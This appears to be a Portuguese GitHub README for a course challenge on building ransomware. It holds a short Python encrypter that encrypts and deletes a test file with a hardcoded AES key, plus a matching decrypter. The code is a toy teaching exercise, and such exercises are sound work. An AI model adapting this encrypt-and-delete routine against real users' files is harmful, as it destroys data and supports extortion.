# Desafio-de-Cria-o-de-Ransomware
Entrega Desafio de Criação de Ransomware

encrypter
import os
import pyaes

## abrir o arquivo a ser criptografado
file_name = "teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"test1ransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwarexibiu"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
 ================================

 decrypter

import os
import pyaes

## abrir o arquivo criptografado
file_name = "teste.txt.ransomwarexibiu"
file = open(file_name, "rb")
file_data = file.read()
file.close()

## chave para descriptografia
key = b"test1ransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

## remover o arquivo criptografado
os.remove(file_name)

## criar o arquivo descriptografado
new_file = "teste.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()

---------------------------------

## RESULTADOS ##
![image](https://github.com/user-attachments/assets/de2e3ca7-fd11-493e-9265-1811c8b70abd)

![image](https://github.com/user-attachments/assets/b6a308dc-fd21-4dbe-8c69-4d20682e888e)

![image](https://github.com/user-attachments/assets/4b423ddc-7ae3-4f14-bbf6-ce498e09a2c3)






